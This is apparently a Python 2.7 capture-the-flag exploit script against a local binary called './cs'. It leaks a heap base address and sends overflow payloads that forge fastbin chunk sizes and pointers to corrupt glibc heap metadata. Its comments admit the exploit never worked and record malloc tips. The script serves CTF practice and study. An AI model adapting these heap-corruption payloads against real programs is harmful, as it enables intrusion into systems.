#!/usr/bin/env python2.7
# -*- coding:utf-8 -*-
from mkpwn import *

# settings
local   = True
debug   = True

if local:
    target  = './cs'
else:
    target  = ('0', 0)

# get io
io  = mk(target, debug)


# I cannot exploit this vulnerable program.
# but I learn some tips from the process of exploiting.

# malloc consolidate, fastbin will be tear down when free a large chunk
# when free fastbin chunk, free() will check next neighbor chunk's size whether small enough

# exp
def exp():
    io.ru('Your name:')
    io.pr()
    io.ru('Your Description:')
    io.pr()

    io.pr(['m', 1] + ['m', 'y', 1] * 6)

    io.pr('y', 0x80)
    io.ru('To ALL:')
    io.pr()

    io.pr('y', 0x70)
    io.ru('To ALL:')
    io.pr('A' * 9)
    io.ru('A' * 9)
    heap_base = l64(('\x00' + io.rl()[:-1]).ljust(0x8, '\x00'))
    info_found('heap base', heap_base)

    io.pr('~', 'rename')
    io.pr('A' * 0x280 + l64(0x0) + l64(0x40) + l64(0x606490))
    io.pr('exit')

    io.hint([0x401da3])
    io.pr(['m', 'y', 1]*3)
    io.pr('y', 0x70)
    io.ru('To ALL:')
    io.pr(('A' * 0x10 + l64(0x0) + l64(0x40) + l64(0x0)).ljust(0x70, 'A') + l64(0x80) + l64(0x41) + l64(0x606470))

    io.pr(['m', 'y', 1]*3)
    io.pr('y', 0x30)
    io.ru('To ALL:')
    io.pr()

    io.interact()

# main
if __name__ == '__main__':
    exp()
